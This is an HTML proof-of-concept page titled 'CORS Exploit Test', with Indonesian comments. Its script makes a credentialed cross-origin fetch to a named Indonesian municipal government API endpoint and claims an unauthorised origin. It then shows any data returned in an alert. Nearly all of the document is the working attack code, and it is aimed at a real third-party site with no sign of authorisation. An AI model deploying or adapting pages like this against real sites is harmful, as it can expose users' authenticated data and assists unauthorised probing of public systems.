<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit Test</title>
</head>
<body>
    <h1>Testing CORS Exploit on pakmo.mojokertokota.go.id</h1>

    <script>
        // Uji apakah server target mengizinkan permintaan dari domain tidak sah (pklraul.me)
        let targetURL = "https://pakmo.mojokertokota.go.id/api/home/statistic";

        fetch(targetURL, {
            method: 'GET', // Bisa diubah ke POST atau metode lain tergantung endpoint
            credentials: 'include', // Jika API target menggunakan cookie untuk otentikasi
            headers: {
                'Origin': 'https://pklraul.me', // Meniru asal permintaan dari pklraul.me
                'Accept': 'application/json, text/plain, */*',
            }
        })
        .then(response => {
            // Cek jika server mengizinkan akses dari asal yang tidak sah
            if (response.ok) {
                return response.json();
            } else {
                throw new Error('Request failed');
            }
        })
        .then(data => {
            console.log('Response from target:', data);
            alert('Data from target: ' + JSON.stringify(data)); // Menampilkan data dari target dalam alert box
        })
        .catch(err => console.error('Error:', err));
    </script>

</body>
</html>
